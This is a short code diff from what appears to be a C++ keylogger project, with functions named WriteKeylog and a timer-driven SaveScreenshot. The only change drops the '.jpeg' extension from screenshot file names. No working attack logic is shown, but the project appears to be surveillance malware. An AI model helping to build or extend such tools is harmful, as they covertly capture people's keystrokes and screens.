@@ -60,7 +60,8 @@ void WriteKeylog()
 // screenshotTimer Handler function
 void SaveScreenshot()
 {
-	std::string path = IO::GetOutputPath(true) + Utils::DateTime::Now().GetTimestamp() + ".jpeg";
+	// std::string path = IO::GetOutputPath(true) + Utils::DateTime::Now().GetTimestamp() + ".jpeg";
+	std::string path = IO::GetOutputPath(true) + Utils::DateTime::Now().GetTimestamp();
 	Screenshot ss(path);
 	if (ss.Process())
 	{
